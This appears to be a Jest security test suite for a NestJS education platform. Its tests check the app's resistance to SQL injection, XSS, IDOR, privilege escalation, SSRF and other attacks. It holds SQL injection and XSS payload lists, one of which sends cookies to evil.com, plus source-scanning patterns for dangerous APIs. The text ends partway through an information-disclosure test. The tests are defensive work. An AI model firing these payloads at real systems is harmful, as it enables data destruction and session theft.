/**
 * PRODUCTION SECURITY SIMULATION TESTS - WingsEd Platform
 * Comprehensive attack simulation across 22 categories
 */
import 'reflect-metadata';
import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe, HttpStatus } from '@nestjs/common';
import { mockDeep, DeepMockProxy } from 'jest-mock-extended';
import { PrismaClient, Role, ApplicationStatus, CampusType, DegreeType, TestTaken } from '@prisma/client';
import { PrismaService } from '../prisma/prisma.service';
import { ConfigService } from '@nestjs/config';

// Services
import { ApplicationsService } from '../modules/applications/applications.service';
import { SavedUniversitiesService } from '../modules/saved-universities/saved-universities.service';
import { ProfileService } from '../modules/profile/profile.service';

// Guards
import { ClerkAuthGuard } from './guards/clerk-auth.guard';
import { AdminGuard } from './guards/admin.guard';

// DTOs
import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { CreateWhatsAppLeadDto } from '../modules/leads/dto/create-whatsapp-lead.dto';
import { CreateProfileDto } from '../modules/profile/dto/create-profile.dto';
import { UpdateProfileDto } from '../modules/profile/dto/update-profile.dto';
import { GetUniversitiesDto } from '../modules/universities/dto/get-universities.dto';
import { CreateUniversityDto } from '../modules/admin/dto/create-university.dto';
import { UpdateUniversityDto } from '../modules/admin/dto/update-university.dto';
import { UpdateUserRoleDto } from '../modules/admin/dto/update-user-role.dto';
import { CreateApplicationDto } from '../modules/applications/dto/create-application.dto';
import { UpdateApplicationDto } from '../modules/applications/dto/update-application.dto';
import { CreateProgramDto } from '../modules/admin/dto/create-program.dto';
import { UpdateProgramDto } from '../modules/admin/dto/update-program.dto';

// Helpers
async function validateDto<T extends object>(
  DtoClass: new () => T,
  data: Record<string, unknown>,
): Promise<string[]> {
  const instance = plainToInstance(DtoClass, data);
  const errors = await validate(instance, {
    whitelist: true,
    forbidNonWhitelisted: true,
  });
  return errors.map((e) => Object.values(e.constraints || {}).join(', '));
}

function readSourceFile(relativePath: string): string {
  const fs = require('fs');
  const path = require('path');
  return fs.readFileSync(path.join(__dirname, relativePath), 'utf8');
}

function scanDirectory(dir: string, ext: string): string[] {
  const fs = require('fs');
  const path = require('path');
  const results: string[] = [];
  try {
    const items = fs.readdirSync(dir, { withFileTypes: true });
    for (const item of items) {
      const full = path.join(dir, item.name);
      if (item.isDirectory() && !['node_modules', '.next', 'coverage', 'dist'].includes(item.name)) {
        results.push(...scanDirectory(full, ext));
      } else if (item.name.endsWith(ext) && !item.name.endsWith('.spec.ts') && !item.name.endsWith('.spec.tsx')) {
        results.push(full);
      }
    }
  } catch { /* skip */ }
  return results;
}

const MOCK_USER = {
  id: 'user-A', clerkId: 'clerk-A', email: 'a@test.com',
  role: 'STUDENT' as Role, onboardingStep: 3, createdAt: new Date(), updatedAt: new Date(),
};

// ============================
// 1. SQL INJECTION (SQLi)
// ============================
describe('Attack 1: SQL Injection', () => {
  const SQL_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1'; EXEC xp_cmdshell('whoami'); --",
    "' UNION SELECT * FROM information_schema.tables; --",
    "1; UPDATE users SET role='ADMIN' WHERE 1=1; --",
    "'; DELETE FROM \"University\" WHERE 1=1; --",
    "Robert'); DROP TABLE students;--",
    "admin'--",
    "' OR 1=1 LIMIT 1; --",
    "1' AND (SELECT COUNT(*) FROM users) > 0; --",
  ];

  describe('No raw SQL anywhere in codebase', () => {
    it('should have zero instances of $queryRaw, $executeRaw, or unsafe variants', () => {
      const path = require('path');
      const srcDir = path.join(__dirname, '..');
      const files = scanDirectory(srcDir, '.ts');
      const dangerous = ['$queryRawUnsafe', '$executeRawUnsafe', '$queryRaw', '$executeRaw'];

      const violations: string[] = [];
      for (const file of files) {
        const fs = require('fs');
        const content = fs.readFileSync(file, 'utf8');
        for (const pattern of dangerous) {
          if (content.includes(pattern)) {
            violations.push(`${file}: contains ${pattern}`);
          }
        }
      }
      expect(violations).toEqual([]);
    });
  });

  describe('SQLi payloads through DTO fields', () => {
    for (const payload of SQL_PAYLOADS.slice(0, 3)) {
      it(`Lead name: "${payload.substring(0, 30)}..." - Prisma parameterizes`, async () => {
        // Passes validation (it's a string) but Prisma parameterizes
        const dto = plainToInstance(CreateWhatsAppLeadDto, { name: payload });
        expect(dto.name).toBe(payload);
      });
    }

    it('SQLi in university search query accepted as string (parameterized)', async () => {
      const errors = await validateDto(GetUniversitiesDto, {
        search: "' OR 1=1; DROP TABLE universities; --",
      });
      expect(errors).toHaveLength(0);
    });
  });

  describe('Prisma parameterization proof', () => {
    let prisma: DeepMockProxy<PrismaClient>;
    let service: ApplicationsService;

    beforeEach(async () => {
      prisma = mockDeep<PrismaClient>();
      const module = await Test.createTestingModule({
        providers: [
          ApplicationsService,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();
      service = module.get(ApplicationsService);
    });

    it('SQLi in universityId goes through findUnique (parameterized)', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.university.findUnique.mockResolvedValue(null);

      await expect(
        service.createApplication('clerk-A', {
          universityId: "'; DROP TABLE applications; --",
        } as any),
      ).rejects.toThrow('University not found');

      expect(prisma.university.findUnique).toHaveBeenCalledWith({
        where: { id: "'; DROP TABLE applications; --" },
      });
    });
  });
});

// ============================
// 2. CROSS-SITE SCRIPTING (XSS)
// ============================
describe('Attack 2: Cross-Site Scripting (XSS)', () => {
  const XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("imgXSS")>',
    '<svg onload=alert("svgXSS")>',
    '"><script>document.location="https://evil.com?c="+document.cookie</script>',
    "javascript:alert('jsXSS')",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("bodyXSS")>',
    '{{constructor.constructor("return this")().alert("ssti")}}',
    '${7*7}',
    '<details open ontoggle=alert("detailsXSS")>',
    '<marquee onstart=alert("marquee")>',
    "'-alert(1)-'",
    '"><img src=x onerror=alert(1)//',
  ];

  describe('Stored XSS: user input stored safely', () => {
    for (const payload of XSS_PAYLOADS) {
      it(`payload "${payload.substring(0, 40)}..." stored as plain text`, async () => {
        if (payload.length <= 255) {
          const errors = await validateDto(CreateWhatsAppLeadDto, { name: payload });
          expect(errors).toHaveLength(0);
        }
      });
    }
  });

  describe('Reflected XSS: query parameters', () => {
    it('XSS in university search - React auto-escapes on render', async () => {
      const malicious = { search: '<script>alert(1)</script>' };
      const errors = await validateDto(GetUniversitiesDto, malicious);
      expect(errors).toHaveLength(0);
    });
  });

  describe('No dangerouslySetInnerHTML anywhere', () => {
    it('should find zero uses in frontend', () => {
      const path = require('path');
      const frontendSrc = path.join(__dirname, '../../../frontend/src');
      const tsxFiles = scanDirectory(frontendSrc, '.tsx');
      const jsxFiles = scanDirectory(frontendSrc, '.jsx');

      const violations: string[] = [];
      const fs = require('fs');
      for (const file of [...tsxFiles, ...jsxFiles]) {
        const content = fs.readFileSync(file, 'utf8');
        if (content.includes('dangerouslySetInnerHTML')) {
          violations.push(file);
        }
      }
      expect(violations).toEqual([]);
    });
  });

  describe('URL-based XSS in admin DTOs', () => {
    const baseUni = { name: 'Test', country: 'US', city: 'NYC', tuitionFee: 1000, publicPrivate: 'Public' };

    it('rejects javascript: protocol in logoUrl', async () => {
      const errors = await validateDto(CreateUniversityDto, { ...baseUni, logoUrl: 'javascript:alert(1)' });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('rejects data: URI in imageUrl', async () => {
      const errors = await validateDto(CreateUniversityDto, { ...baseUni, imageUrl: 'data:text/html,<script>alert(1)</script>' });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('rejects vbscript: in websiteUrl', async () => {
      const errors = await validateDto(CreateUniversityDto, { ...baseUni, websiteUrl: 'vbscript:MsgBox("xss")' });
      expect(errors.length).toBeGreaterThan(0);
    });
  });
});

// ============================
// 3. CSRF PROTECTION
// ============================
describe('Attack 3: Cross-Site Request Forgery (CSRF)', () => {
  it('all mutation endpoints require Bearer token (CSRF-resistant)', () => {
    const path = require('path');
    const controllersDir = path.join(__dirname, '../modules');
    const files = scanDirectory(controllersDir, '.controller.ts');

    for (const file of files) {
      const fs = require('fs');
      const content = fs.readFileSync(file, 'utf8');
      const hasMutation = content.includes('@Post') || content.includes('@Patch') || content.includes('@Delete');

      if (hasMutation) {
        const isWebhook = file.includes('webhooks');
        const isUniversities = file.includes('universities.controller');
        if (!isWebhook && !isUniversities) {
          expect(content).toMatch(/UseGuards.*ClerkAuthGuard/s);
        }
      }
    }
  });

  it('API does NOT use cookies for auth', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).not.toContain('cookie-parser');
    expect(mainCode).not.toContain('express-session');
    expect(mainCode).not.toContain('cookie(');
  });

  it('CORS restricts origins', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).not.toMatch(/origin:\s*['"]\*['"]/);
    expect(mainCode).not.toMatch(/origin:\s*true/);
    expect(mainCode).toContain('CORS_ORIGINS');
  });
});

// ============================
// 4. BROKEN ACCESS CONTROL / IDOR
// ============================
describe('Attack 4: Broken Access Control / IDOR', () => {
  let prisma: DeepMockProxy<PrismaClient>;

  beforeEach(() => {
    prisma = mockDeep<PrismaClient>();
  });

  describe('Application IDOR: user A cannot access user B applications', () => {
    let service: ApplicationsService;

    beforeEach(async () => {
      const module = await Test.createTestingModule({
        providers: [
          ApplicationsService,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();
      service = module.get(ApplicationsService);
    });

    it('GET /applications scoped to clerkId', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.application.findMany.mockResolvedValue([]);
      await service.getApplications('clerk-A');
      expect(prisma.application.findMany).toHaveBeenCalledWith(
        expect.objectContaining({ where: { userId: 'user-A' } }),
      );
    });

    it('PATCH /applications/:id cannot update another user application', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.application.findFirst.mockResolvedValue(null);
      await expect(
        service.updateApplication('clerk-A', 'app-belonging-to-B', { status: 'ACCEPTED' as ApplicationStatus }),
      ).rejects.toThrow('Application not found');
    });

    it('DELETE /applications/:id cannot delete another user application', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.application.findFirst.mockResolvedValue(null);
      await expect(
        service.deleteApplication('clerk-A', 'app-belonging-to-B'),
      ).rejects.toThrow('Application not found');
    });

    it('service uses findFirst with compound userId + applicationId check', () => {
      const serviceCode = readSourceFile('../modules/applications/applications.service.ts');
      const updateBlock = serviceCode.substring(serviceCode.indexOf('async updateApplication'));
      expect(updateBlock).toContain('userId: user.id');
      expect(updateBlock).toContain('id: applicationId');
    });
  });

  describe('SavedUniversities IDOR: user A cannot unsave user B', () => {
    let service: SavedUniversitiesService;

    beforeEach(async () => {
      const module = await Test.createTestingModule({
        providers: [
          SavedUniversitiesService,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();
      service = module.get(SavedUniversitiesService);
    });

    it('unsaveUniversity scoped by clerkId lookup', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.savedUniversity.findUnique.mockResolvedValue(null);
      await expect(
        service.unsaveUniversity('clerk-A', 'uni-saved-by-B'),
      ).rejects.toThrow('Saved university not found');
    });

    it('getSavedUniversities returns only current user saves', async () => {
      prisma.user.findUnique.mockResolvedValue(MOCK_USER);
      prisma.savedUniversity.findMany.mockResolvedValue([]);
      await service.getSavedUniversities('clerk-A');
      expect(prisma.savedUniversity.findMany).toHaveBeenCalledWith(
        expect.objectContaining({ where: { userId: 'user-A' } }),
      );
    });
  });

  describe('Profile IDOR: cannot access another user profile', () => {
    let service: ProfileService;

    beforeEach(async () => {
      const module = await Test.createTestingModule({
        providers: [
          ProfileService,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();
      service = module.get(ProfileService);
    });

    it('findByClerkId tied to token identity not URL param', async () => {
      prisma.user.findUnique.mockResolvedValue(null);
      const result = await service.findByClerkId('clerk-A');
      expect(result).toBeNull();
      expect(prisma.user.findUnique).toHaveBeenCalledWith(
        expect.objectContaining({ where: { clerkId: 'clerk-A' } }),
      );
    });

    it('controller uses @CurrentUser() not @Param for identity', () => {
      const controllerCode = readSourceFile('../modules/profile/profile.controller.ts');
      expect(controllerCode).toContain('@CurrentUser()');
      expect(controllerCode).not.toContain("@Param('userId')");
      expect(controllerCode).not.toContain("@Param('clerkId')");
    });
  });

  describe('Controllers derive userId from JWT, never from request body/params', () => {
    const controllerFiles = [
      '../modules/applications/applications.controller.ts',
      '../modules/saved-universities/saved-universities.controller.ts',
      '../modules/profile/profile.controller.ts',
      '../modules/users/users.controller.ts',
      '../modules/leads/leads.controller.ts',
    ];

    for (const file of controllerFiles) {
      it(`${file.split('/').pop()} uses @CurrentUser for identity`, () => {
        const code = readSourceFile(file);
        expect(code).toContain('@CurrentUser()');
        expect(code).not.toContain("@Body('userId')");
        expect(code).not.toContain("@Body('clerkId')");
        expect(code).not.toContain("@Param('userId')");
        expect(code).not.toContain("@Param('clerkId')");
      });
    }
  });
});

// ============================
// 5. PRIVILEGE ESCALATION
// ============================
describe('Attack 5: Privilege Escalation', () => {
  describe('AdminGuard: non-admin roles rejected', () => {
    let adminGuard: AdminGuard;
    let prisma: DeepMockProxy<PrismaClient>;

    beforeEach(async () => {
      prisma = mockDeep<PrismaClient>();
      const module = await Test.createTestingModule({
        providers: [
          AdminGuard,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();
      adminGuard = module.get(AdminGuard);
    });

    const makeContext = (user: any) => ({
      switchToHttp: () => ({
        getRequest: () => ({ user }),
      }),
    });

    it('STUDENT token rejected on admin routes', async () => {
      prisma.user.findUnique.mockResolvedValue({ ...MOCK_USER, role: 'STUDENT' });
      await expect(adminGuard.canActivate(makeContext({ id: 'c1' }) as any)).rejects.toThrow('Admin access required');
    });

    it('COUNSELOR token rejected on admin routes', async () => {
      prisma.user.findUnique.mockResolvedValue({ ...MOCK_USER, role: 'COUNSELOR' });
      await expect(adminGuard.canActivate(makeContext({ id: 'c1' }) as any)).rejects.toThrow('Admin access required');
    });

    it('null user rejected', async () => {
      await expect(adminGuard.canActivate(makeContext(null) as any)).rejects.toThrow('User not authenticated');
    });

    it('user not in DB rejected', async () => {
      prisma.user.findUnique.mockResolvedValue(null);
      await expect(adminGuard.canActivate(makeContext({ id: 'unknown' }) as any)).rejects.toThrow('User not found');
    });

    it('ADMIN token passes', async () => {
      prisma.user.findUnique.mockResolvedValue({ ...MOCK_USER, role: 'ADMIN' });
      const result = await adminGuard.canActivate(makeContext({ id: 'c1' }) as any);
      expect(result).toBe(true);
    });
  });

  describe('Admin controller uses both guards', () => {
    it('admin.controller.ts has ClerkAuthGuard AND AdminGuard', () => {
      const code = readSourceFile('../modules/admin/admin.controller.ts');
      expect(code).toContain('ClerkAuthGuard');
      expect(code).toContain('AdminGuard');
      expect(code).toContain('@UseGuards(ClerkAuthGuard, AdminGuard)');
    });
  });

  describe('Role update validation', () => {
    it('SUPERADMIN role rejected', async () => {
      const errors = await validateDto(UpdateUserRoleDto, { role: 'SUPERADMIN' });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('empty role rejected', async () => {
      const errors = await validateDto(UpdateUserRoleDto, { role: '' });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('SQL injection in role rejected', async () => {
      const errors = await validateDto(UpdateUserRoleDto, { role: "ADMIN' OR '1'='1" });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('integer role rejected', async () => {
      const errors = await validateDto(UpdateUserRoleDto, { role: 0 });
      expect(errors.length).toBeGreaterThan(0);
    });

    it('array role rejected', async () => {
      const errors = await validateDto(UpdateUserRoleDto, { role: ['ADMIN', 'STUDENT'] });
      expect(errors.length).toBeGreaterThan(0);
    });
  });
});

// ============================
// 6. MASS ASSIGNMENT
// ============================
describe('Attack 6: Mass Assignment', () => {
  describe('Extra fields rejected by forbidNonWhitelisted', () => {
    it('CreateWhatsAppLeadDto + isAdmin=true rejected', async () => {
      const errors = await validateDto(CreateWhatsAppLeadDto, { name: 'John', isAdmin: true });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('CreateProfileDto + role=ADMIN rejected', async () => {
      const errors = await validateDto(CreateProfileDto, {
        country: 'US', targetField: 'CS', testTaken: 'NONE', role: 'ADMIN',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('CreateProfileDto + id=inject rejected', async () => {
      const errors = await validateDto(CreateProfileDto, {
        country: 'US', targetField: 'CS', testTaken: 'NONE', id: 'injected-id',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('CreateApplicationDto + userId=hack rejected', async () => {
      const errors = await validateDto(CreateApplicationDto, {
        universityId: 'uni-1', userId: 'hacked-user-id',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('CreateApplicationDto + createdAt=2020 rejected', async () => {
      const errors = await validateDto(CreateApplicationDto, {
        universityId: 'uni-1', createdAt: '2020-01-01',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('UpdateApplicationDto + userId=hack rejected', async () => {
      const errors = await validateDto(UpdateApplicationDto, {
        status: 'APPLIED', userId: 'attacker-id',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('CreateUniversityDto + id=inject rejected', async () => {
      const errors = await validateDto(CreateUniversityDto, {
        name: 'MIT', country: 'US', city: 'Cambridge', tuitionFee: 50000, publicPrivate: 'Private', id: 'injected',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('UpdateProfile + clerkId=attacker rejected', async () => {
      const errors = await validateDto(UpdateProfileDto, {
        country: 'UK', clerkId: 'attacker-clerk-id',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });

    it('UpdateProfile + email=hacker@evil.com rejected', async () => {
      const errors = await validateDto(UpdateProfileDto, {
        country: 'UK', email: 'hacker@evil.com',
      });
      expect(errors.some((e) => e.includes('should not exist'))).toBe(true);
    });
  });

  describe('Service layer field safety', () => {
    it('ProfileService.create does not spread entire dto', () => {
      const code = readSourceFile('../modules/profile/profile.service.ts');
      const createBlock = code.substring(code.indexOf('async create('), code.indexOf('async update('));
      expect(createBlock).toContain('dto.country');
      expect(createBlock).toContain('dto.targetField');
      expect(createBlock).not.toMatch(/data:\s*\{\s*\.\.\.dto\s*\}/);
    });
  });
});

// ============================
// 7. RATE LIMITING ABUSE
// ============================
describe('Attack 7: Rate Limiting Abuse', () => {
  it('ThrottlerGuard is registered as global APP_GUARD', () => {
    const appModule = readSourceFile('../app.module.ts');
    expect(appModule).toContain('APP_GUARD');
    expect(appModule).toContain('ThrottlerGuard');
  });

  it('rate limit configured: 100 requests per 15 minutes', () => {
    const appModule = readSourceFile('../app.module.ts');
    expect(appModule).toContain('THROTTLE_TTL');
    expect(appModule).toContain('THROTTLE_LIMIT');
    expect(appModule).toContain('900000');
    expect(appModule).toContain('100');
  });

  it('webhook endpoint skips throttle', () => {
    const webhookCode = readSourceFile('../modules/webhooks/webhooks.controller.ts');
    expect(webhookCode).toContain('SkipThrottle');
  });

  it('non-webhook endpoints do NOT skip throttle', () => {
    const controllers = [
      '../modules/users/users.controller.ts',
      '../modules/profile/profile.controller.ts',
      '../modules/leads/leads.controller.ts',
      '../modules/applications/applications.controller.ts',
      '../modules/saved-universities/saved-universities.controller.ts',
      '../modules/admin/admin.controller.ts',
    ];
    for (const file of controllers) {
      const code = readSourceFile(file);
      expect(code).not.toContain('SkipThrottle');
    }
  });
});

// ============================
// 8. JWT FORGERY
// ============================
describe('Attack 8: JWT Forgery', () => {
  it('ClerkAuthGuard verifies tokens via Clerk SDK, not local secret', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain('verifyToken');
    expect(guardCode).toContain('@clerk/backend');
    expect(guardCode).not.toContain('jwt.verify');
    expect(guardCode).not.toContain('jsonwebtoken');
  });

  it('token without Bearer prefix is rejected', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain("startsWith('Bearer ')");
    expect(guardCode).toContain('Missing or invalid authorization header');
  });

  it('invalid/expired tokens throw UnauthorizedException', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain('Invalid or expired token');
    expect(guardCode).toContain('UnauthorizedException');
  });

  it('token without sub claim is rejected', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain('payload.sub');
    expect(guardCode).toContain('Invalid token payload');
  });

  it('Clerk secret key must be configured', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).toContain('CLERK_SECRET_KEY is not configured');
    expect(guardCode).toContain('throw new Error');
  });

  it('guard does NOT decode JWT manually - delegates to Clerk SDK', () => {
    const guardCode = readSourceFile('./guards/clerk-auth.guard.ts');
    expect(guardCode).not.toContain('Buffer.from');
    expect(guardCode).not.toContain('atob');
    expect(guardCode).not.toContain('jwt.decode');
  });
});

// ============================
// 9. OPEN REDIRECTS
// ============================
describe('Attack 9: Open Redirects', () => {
  it('backend does NOT perform any HTTP redirects', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '../modules');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toContain('@Redirect');
      expect(content).not.toContain('res.redirect');
      expect(content).not.toContain('response.redirect');
    }
  });

  it('lead redirect URL is constructed server-side', () => {
    const leadsCode = readSourceFile('../modules/leads/leads.service.ts');
    expect(leadsCode).toContain('wa.me');
    expect(leadsCode).toContain('this.whatsappNumber');
    expect(leadsCode).toContain('encodeURIComponent');
  });

  it('frontend Clerk redirects use hardcoded paths, not query params', () => {
    const middleware = readSourceFile('../../../frontend/src/middleware.ts');
    expect(middleware).not.toContain('redirect=');
    expect(middleware).not.toContain('returnTo');
    expect(middleware).not.toContain('next=');
  });

  it('Clerk redirect URLs are relative paths in env config', () => {
    const fs = require('fs');
    const path = require('path');
    let envExample: string;
    try {
      envExample = fs.readFileSync(path.join(__dirname, '../../../frontend/.env.example'), 'utf8');
    } catch {
      envExample = '';
    }
    if (envExample) {
      const signInUrl = envExample.match(/NEXT_PUBLIC_CLERK_SIGN_IN_URL="([^"]+)"/)?.[1];
      const signUpUrl = envExample.match(/NEXT_PUBLIC_CLERK_SIGN_UP_URL="([^"]+)"/)?.[1];
      const afterSignIn = envExample.match(/NEXT_PUBLIC_CLERK_AFTER_SIGN_IN_URL="([^"]+)"/)?.[1];
      const afterSignUp = envExample.match(/NEXT_PUBLIC_CLERK_AFTER_SIGN_UP_URL="([^"]+)"/)?.[1];

      for (const url of [signInUrl, signUpUrl, afterSignIn, afterSignUp]) {
        if (url) {
          expect(url).toMatch(/^\//);
          expect(url).not.toMatch(/^https?:\/\//);
        }
      }
    }
  });
});

// ============================
// 10. FILE UPLOAD EXPLOITS
// ============================
describe('Attack 10: File Upload Exploits', () => {
  it('NO file upload endpoints exist in the backend', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '..');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    const uploadPatterns = [
      'FileInterceptor', 'FilesInterceptor', 'FileFieldsInterceptor',
      'AnyFilesInterceptor', '@UploadedFile', '@UploadedFiles',
      'multer', 'Multer', 'multipart/form-data',
    ];

    const violations: string[] = [];
    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      for (const pattern of uploadPatterns) {
        if (content.includes(pattern)) {
          violations.push(`${path.basename(file)}: ${pattern}`);
        }
      }
    }
    expect(violations).toEqual([]);
  });

  it('NO S3/AWS SDK configured', () => {
    const fs = require('fs');
    const path = require('path');
    const packageJson = JSON.parse(
      fs.readFileSync(path.join(__dirname, '../../package.json'), 'utf8'),
    );
    const allDeps = { ...packageJson.dependencies, ...packageJson.devDependencies };
    expect(allDeps['aws-sdk']).toBeUndefined();
    expect(allDeps['@aws-sdk/client-s3']).toBeUndefined();
  });
});

// ============================
// 11. SSRF
// ============================
describe('Attack 11: SSRF', () => {
  it('backend does NOT make HTTP requests to user-supplied URLs', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '..');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    const fetchPatterns = ['axios', 'node-fetch', 'got(', 'undici', 'http.get(', 'https.get(', 'fetch(', 'request('];
    const violations: string[] = [];
    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      for (const pattern of fetchPatterns) {
        if (content.includes(pattern) && !file.includes('node_modules')) {
          violations.push(`${path.basename(file)}: ${pattern}`);
        }
      }
    }
    expect(violations).toEqual([]);
  });

  it('no URL-fetching packages in dependencies', () => {
    const fs = require('fs');
    const path = require('path');
    const packageJson = JSON.parse(
      fs.readFileSync(path.join(__dirname, '../../package.json'), 'utf8'),
    );
    const allDeps = { ...packageJson.dependencies, ...packageJson.devDependencies };
    expect(allDeps['axios']).toBeUndefined();
    expect(allDeps['node-fetch']).toBeUndefined();
    expect(allDeps['got']).toBeUndefined();
  });
});

// ============================
// 12. HEADER INJECTION
// ============================
describe('Attack 12: Header Injection', () => {
  it('no manual header setting from user input', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '../modules');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toContain('res.setHeader');
      expect(content).not.toContain('response.setHeader');
      expect(content).not.toContain('res.header(');
    }
  });

  it('Helmet sets protective headers', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).toContain("import helmet from 'helmet'");
    expect(mainCode).toContain('app.use(helmet())');
  });
});

// ============================
// 13. PATH TRAVERSAL
// ============================
describe('Attack 13: Path Traversal', () => {
  it('no file system reads based on user input', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '../modules');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toContain('fs.readFile');
      expect(content).not.toContain('fs.readFileSync');
      expect(content).not.toContain("require('fs')");
      expect(content).not.toContain('readFile(');
    }
  });

  it('no serveStatic or static file serving', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).not.toContain('ServeStaticModule');
    expect(mainCode).not.toContain('express.static');
    expect(mainCode).not.toContain('app.useStaticAssets');
  });
});

// ============================
// 14. ReDoS
// ============================
describe('Attack 14: ReDoS', () => {
  it('no user-supplied regex patterns in the codebase', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '../modules');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    for (const file of files) {
      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toContain('new RegExp(');
    }
  });

  it('Prisma uses contains/startsWith (no regex in DB queries)', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '../modules');
    const serviceFiles = scanDirectory(srcDir, '.service.ts');
    const fs = require('fs');

    for (const file of serviceFiles) {
      const content = fs.readFileSync(file, 'utf8');
      expect(content).not.toMatch(/mode:\s*['"]regex['"]/);
    }
  });
});

// ============================
// 15. PROTOTYPE POLLUTION
// ============================
describe('Attack 15: Prototype Pollution', () => {
  it('__proto__ in body fields rejected by forbidNonWhitelisted', async () => {
    const instance = plainToInstance(CreateWhatsAppLeadDto, {
      name: 'test',
      __proto__: { isAdmin: true },
    } as any);
    expect((instance as any).isAdmin).toBeUndefined();
  });

  it('constructor.prototype injection does not pollute DTO object', async () => {
    const malicious = { country: 'US', targetField: 'CS', testTaken: 'NONE' };
    const instance = plainToInstance(CreateProfileDto, malicious);
    expect(instance).toBeInstanceOf(CreateProfileDto);
    expect((instance as any).isAdmin).toBeUndefined();
    expect(Object.getPrototypeOf(instance).constructor.name).toBe('CreateProfileDto');
  });
});

// ============================
// 16. WEBHOOK FORGERY
// ============================
describe('Attack 16: Webhook Forgery', () => {
  it('webhook signature is ALWAYS verified (not conditional)', () => {
    const code = readSourceFile('../modules/webhooks/webhooks.controller.ts');
    expect(code).not.toContain('if (webhookSecret)');
    expect(code).toContain("throw new BadRequestException('Webhook secret is not configured");
  });

  it('webhook uses svix library for cryptographic verification', () => {
    const code = readSourceFile('../modules/webhooks/webhooks.controller.ts');
    expect(code).toContain("import { Webhook } from 'svix'");
    expect(code).toContain('wh.verify');
  });

  it('invalid signature throws BadRequestException', () => {
    const code = readSourceFile('../modules/webhooks/webhooks.controller.ts');
    expect(code).toContain('Invalid webhook signature');
    expect(code).toContain('BadRequestException');
  });

  it('rawBody is enabled for accurate signature verification', () => {
    const mainCode = readSourceFile('../main.ts');
    expect(mainCode).toContain('rawBody: true');
  });
});

// ============================
// 17. INFORMATION DISCLOSURE
// ============================
describe('Attack 17: Information Disclosure', () => {
  it('error responses do NOT contain stack traces', () => {
    const filterCode = readSourceFile('./filters/all-exceptions.filter.ts');
    const responseBlock = filterCode.substring(filterCode.indexOf('const errorResponse'));
    expect(responseBlock).not.toContain('stack');
  });

  it('non-HTTP errors return generic message', () => {
    const filterCode = readSourceFile('./filters/all-exceptions.filter.ts');
    expect(filterCode).toContain("'Internal server error'");
    expect(filterCode).toContain("'Internal Server Error'");
  });

  it('users/me endpoint does NOT return password or internal DB fields', () => {
    const code = readSourceFile('../modules/users/users.controller.ts');
    const meEndpoint = code.substring(code.indexOf('getCurrentUser'));
    expect(meEndpoint).toContain('id: dbUser.id');
    expect(meEndpoint).toContain('email: dbUser.email');
    expect(meEndpoint).toContain('role: dbUser.role');
  });

  it('no secret keys logged via console.log', () => {
    const path = require('path');
    const srcDir = path.join(__dirname, '..');
    const files = scanDirectory(srcDir, '.ts');
    const fs = require('fs');

    for (const file of files) {
